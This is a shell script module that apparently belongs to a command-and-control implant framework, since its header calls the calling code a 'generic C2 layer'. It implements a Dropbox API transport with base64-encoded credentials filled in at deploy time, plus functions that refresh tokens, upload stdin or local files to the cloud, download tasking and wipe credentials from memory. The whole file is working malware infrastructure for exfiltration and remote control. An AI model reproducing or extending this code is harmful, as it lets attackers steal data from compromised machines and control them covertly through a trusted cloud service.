# === TRANSPORT: Dropbox API v2 ===
# Provider-specific: token refresh, upload, upload_file, download, cleanup.
# Functions called by agent/core.sh (generic C2 layer).
# Credentials are base64 placeholders substituted by the wizard at deploy time.

_TOKEN=""
_K=$(echo "PLACEHOLDER_APP_KEY_B64" | base64 -d)
_S=$(echo "PLACEHOLDER_APP_SECRET_B64" | base64 -d)
_R=$(echo "PLACEHOLDER_REFRESH_TOKEN_B64" | base64 -d)

_token_refresh() {
    log "[TOKEN]: Refreshing access token..."
    local _resp _new
    _resp=$(curl -s --connect-timeout 10 --max-time 30 -X POST \
        https://api.dropboxapi.com/oauth2/token \
        -d "refresh_token=${_R}&grant_type=refresh_token&client_id=${_K}&client_secret=${_S}")
    _new=$(printf '%s' "$_resp" | sed -n 's/.*"access_token"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')
    if [ -n "$_new" ]; then
        _TOKEN="$_new"
        log "[TOKEN]: [OK] Token updated"
        return 0
    fi
    log "[TOKEN]: [X] Refresh ERROR"
    return 1
}

# Upload: reads stdin, uploads to cloud path. Handles token expiry internally.
_upload() {
    local _path="$1" _data _resp
    _data=$(cat)
    _resp=$(printf '%s' "$_data" | curl -s --connect-timeout 10 --max-time 30 \
        -X POST https://content.dropboxapi.com/2/files/upload \
        --header "Authorization: Bearer $_TOKEN" \
        --header "Dropbox-API-Arg: {\"path\":\"${_path}\",\"mode\":\"overwrite\",\"autorename\":false}" \
        --header "Content-Type: application/octet-stream" \
        --data-binary @-)
    if echo "$_resp" | grep -q "expired_access_token\|invalid_access_token"; then
        _token_refresh && \
        _resp=$(printf '%s' "$_data" | curl -s --connect-timeout 10 --max-time 30 \
            -X POST https://content.dropboxapi.com/2/files/upload \
            --header "Authorization: Bearer $_TOKEN" \
            --header "Dropbox-API-Arg: {\"path\":\"${_path}\",\"mode\":\"overwrite\",\"autorename\":false}" \
            --header "Content-Type: application/octet-stream" \
            --data-binary @-)
    fi
}

# Upload a local file to a cloud path. Returns 0 if successful (path_display in response).
_upload_file() {
    local _path="$1" _file="$2" _resp
    _resp=$(curl -s --connect-timeout 10 --max-time 30 \
        -X POST https://content.dropboxapi.com/2/files/upload \
        --header "Authorization: Bearer $_TOKEN" \
        --header "Dropbox-API-Arg: {\"path\":\"${_path}\",\"mode\":\"overwrite\",\"autorename\":false}" \
        --header "Content-Type: application/octet-stream" \
        --data-binary @"${_file}")
    if echo "$_resp" | grep -q "expired_access_token\|invalid_access_token"; then
        _token_refresh && \
        _resp=$(curl -s --connect-timeout 10 --max-time 30 \
            -X POST https://content.dropboxapi.com/2/files/upload \
            --header "Authorization: Bearer $_TOKEN" \
            --header "Dropbox-API-Arg: {\"path\":\"${_path}\",\"mode\":\"overwrite\",\"autorename\":false}" \
            --header "Content-Type: application/octet-stream" \
            --data-binary @"${_file}")
    fi
    echo "$_resp" | grep -q '"path_display"'
}

# Download cloud path to stdout. Handles token expiry internally.
_download() {
    local _path="$1" _resp
    _resp=$(curl -s --connect-timeout 10 --max-time 30 \
        -X POST https://content.dropboxapi.com/2/files/download \
        --header "Authorization: Bearer $_TOKEN" \
        --header "Dropbox-API-Arg: {\"path\":\"${_path}\"}" | tr -d '\000')
    if echo "$_resp" | grep -q "expired_access_token\|invalid_access_token"; then
        _token_refresh && \
        _resp=$(curl -s --connect-timeout 10 --max-time 30 \
            -X POST https://content.dropboxapi.com/2/files/download \
            --header "Authorization: Bearer $_TOKEN" \
            --header "Dropbox-API-Arg: {\"path\":\"${_path}\"}" | tr -d '\000')
    fi
    printf '%s' "$_resp"
}

# Wipe sensitive credential variables from memory.
_transport_cleanup() {
    unset _TOKEN _K _S _R
    unset APP_KEY APP_SECRET REFRESH_TOKEN ACCESS_TOKEN
}

